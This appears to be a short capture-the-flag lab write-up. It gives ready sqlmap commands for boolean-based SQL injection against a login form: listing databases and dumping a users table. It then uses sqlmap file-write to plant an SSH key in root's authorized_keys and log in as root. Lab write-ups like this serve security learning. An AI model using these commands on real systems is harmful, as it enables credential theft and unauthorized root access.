# Boolean
> SQL injection boolean-based + authorized_keys

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Login form with a field vulnerable to SQLi.

## Exploitation

Boolean-based SQL Injection for data extraction:

```
sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" --level 3 --risk 2 --dbs
sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" -D <db> --tables
sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" -D <db> -T users --dump
```

Credentials obtained → SSH access.

## Privilege Escalation

Write to `authorized_keys` via SQLi or compromised credentials of another user:

```
sqlmap ... --file-write id_rsa.pub --file-dest /home/root/.ssh/authorized_keys
```

```
ssh -i id_rsa root@<IP>
```

Root obtained.
